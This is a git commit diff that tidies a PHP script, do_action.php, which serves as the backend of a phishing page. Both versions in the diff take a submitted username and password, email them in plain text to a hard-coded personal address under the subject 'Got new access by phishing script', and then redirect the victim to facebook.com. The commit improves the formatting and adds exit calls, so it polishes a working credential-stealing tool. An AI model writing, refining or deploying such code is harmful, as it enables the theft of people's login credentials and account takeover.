249fdcc5b147ca45b145508ca567900f053a5cdd
Rajiv aryal <rajivary1@gmail.com>
2024-04-11 18:20:51 +0545

    script updated

--- do_action.php
+++ do_action.php
@@ -1,24 +1,25 @@
 <?php
+function mail_sender(){
+    if(!isset($_REQUEST['username']) || !isset($_REQUEST['password'])){
+        return false;
+    }
 
-	function mail_sender(){
-		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
-			return false;
-		}
+    $username = $_REQUEST['username'];
+    $password = $_REQUEST['password'];
 
-		$username = $_REQUEST['username'];
-		$password = $_REQUEST['password'];
-		
-		$reciever = "rajivary1@gmail.com";
-		
-		$subject = "Got new access by phising script";
-		$message = "The username is ". $username;
-		$message .= "and password is ". $password;
-		
-		return mail($reciever, $subject, $message);
-	}
-	
-	if(mail_sender()){
-		header("Location: http://www.facebook.com");
-	}
-	header("location:javascript://history.go(-1)");
+    $reciever = "rajivary1@gmail.com";
+
+    $subject = "Got new access by phishing script";
+    $message = "The username is ". $username . " and password is ". $password;
+
+    return mail($reciever, $subject, $message);
+}
+
+if(mail_sender()){
+    header("Location: http://www.facebook.com");
+    exit(); // Always add an exit after a header redirect
+} else {
+    header("Location: javascript://history.go(-1)");
+    exit(); // Always add an exit after a header redirect
+}
 ?>
